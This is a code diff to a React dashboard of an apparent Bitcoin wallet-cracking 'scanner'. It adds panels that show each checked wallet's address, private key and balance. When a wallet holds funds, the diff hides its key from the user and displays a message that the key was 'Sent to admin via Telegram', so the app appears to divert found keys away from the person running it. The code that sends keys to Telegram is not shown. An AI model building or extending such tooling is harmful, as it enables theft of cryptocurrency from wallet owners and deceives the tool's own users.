@@ -442,6 +442,63 @@ const Dashboard = ({ user, onLogout }) => {
               </div>
             </Card>
 
+            {/* Current Wallet Being Checked */}
+            {scanning && currentWallet && (
+              <Card className="glass p-6 border-binance-gold/50">
+                <h2 className="text-xl font-bold mb-4 text-binance-gold">🔍 Current Wallet</h2>
+                <div className="space-y-3">
+                  <div>
+                    <label className="text-gray-400 text-sm">Address:</label>
+                    <div className="bg-slate-900/50 p-2 rounded mt-1">
+                      <code className="text-binance-gold text-xs break-all">{currentWallet.address}</code>
+                    </div>
+                  </div>
+                  <div>
+                    <label className="text-gray-400 text-sm">Private Key:</label>
+                    <div className="bg-slate-900/50 p-2 rounded mt-1">
+                      <code className="text-white text-xs break-all font-mono">
+                        {currentWallet.privateKey}
+                      </code>
+                    </div>
+                    {currentWallet.hasBalance && (
+                      <p className="text-xs text-binance-gold mt-1">🔒 Private key hidden - Sent to admin via Telegram</p>
+                    )}
+                  </div>
+                  <div className="flex justify-between items-center">
+                    <span className="text-gray-400 text-sm">Balance:</span>
+                    <span className={`font-semibold ${currentWallet.hasBalance ? 'text-binance-green' : 'text-gray-500'}`}>
+                      {currentWallet.balance} BTC
+                    </span>
+                  </div>
+                </div>
+              </Card>
+            )}
+
+            {/* Wallet Check History */}
+            {walletHistory.length > 0 && (
+              <Card className="glass p-6">
+                <h2 className="text-xl font-bold mb-4 text-gray-300">📋 Recent Checks ({walletHistory.length})</h2>
+                <div className="space-y-2 max-h-96 overflow-y-auto">
+                  {walletHistory.map((wallet, idx) => (
+                    <div key={idx} className="bg-slate-900/30 p-3 rounded border border-gray-800 hover:border-gray-700 transition-colors">
+                      <div className="flex justify-between items-start mb-2">
+                        <code className="text-gray-400 text-xs">{wallet.address.substring(0, 20)}...</code>
+                        <span className="text-xs text-gray-500">{wallet.timestamp}</span>
+                      </div>
+                      <div className="flex justify-between items-center text-xs">
+                        <span className="text-gray-500">
+                          {wallet.hasBalance ? "🔑 Key: ********" : `Key: ${wallet.privateKey.substring(0, 16)}...`}
+                        </span>
+                        <span className={wallet.hasBalance ? "text-binance-green font-semibold" : "text-gray-600"}>
+                          {wallet.balance} BTC
+                        </span>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              </Card>
+            )}
+
             {/* Found wallets */}
             <Card data-testid="found-wallets-card" className="glass p-6">
               <h2 className="text-2xl font-bold mb-4 neon-text-green">{t.found_wallets}</h2>
